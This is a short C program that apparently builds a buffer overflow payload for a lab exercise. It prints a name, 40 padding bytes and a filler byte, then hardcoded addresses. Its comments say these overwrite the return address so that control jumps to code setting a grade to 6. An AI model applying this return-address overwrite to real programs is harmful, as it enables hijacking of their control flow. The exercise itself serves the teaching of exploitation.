#include <stdio.h>
/*
address of grade=6 0x8048b68
address of Name  0x80d65e0
*/
int main(){
int i;
putchar('L');
putchar('e');
putchar('f');
putchar('t');
putchar('e');
putchar('r');
putchar('i');
putchar('s');
/*useless space of the array and c*/
for(i=0;i<40;i++)
        putchar('\0');


/*pass 8 bytes in order to reach ret add*/
 putchar('8');

/*change the order of programm*/
putchar(0x68);
putchar(0x8b);
putchar(0x04);
putchar(0x8);
/*override address of the name*/
putchar(0xe0);
putchar(0x65);
putchar(0x0d);
putchar(0x8);
return 0;


}
